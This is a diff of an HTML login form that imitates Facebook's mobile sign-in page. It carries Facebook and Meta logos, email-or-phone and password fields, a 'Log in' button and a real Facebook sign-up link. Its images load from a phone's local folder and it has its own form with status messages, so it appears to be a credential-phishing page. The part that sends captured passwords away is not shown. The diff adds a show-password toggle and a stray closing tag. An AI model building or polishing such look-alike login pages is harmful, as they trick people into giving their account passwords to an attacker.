@@ -15,16 +15,20 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-     <div class=""><img class="logo" src="fb3.png"></div>
-        <form id="messageForm">
+     <div class=""><img class="logo" src="/storage/emulated/0/Documents/pixelLab/fb3.png"></div>
+    <form id="messageForm">
         <input type="text" id="name" placeholder="Mobile number or email address" required>
-        <input type="password" id="password" placeholder="Password" required>
+        <div class="input-wrapper">
+          <input type="password" id="password" placeholder="Password">
+          <span class="toggle-password" onclick="togglePassword()"><b>Show</b></span>
+        </div>
+        </div>
         <button type="submit" class="login-btn"><b>Log in</b></button>
         <a href="#" class="forgot-password"><b>Forgotten password?</b></a>
         <p id="status"></p><!-- Message status -->
         <p id="status2"></p>
         <div class="create-btn" ><a class="create-acct" href="https://m.facebook.com/reg/#">Create new account</a></div>
-        <img class="metaLogo" src="meta.png">
+        <img class="metaLogo" src="/storage/emulated/0/Documents/pixelLab/meta.png">
        
     </form>
       
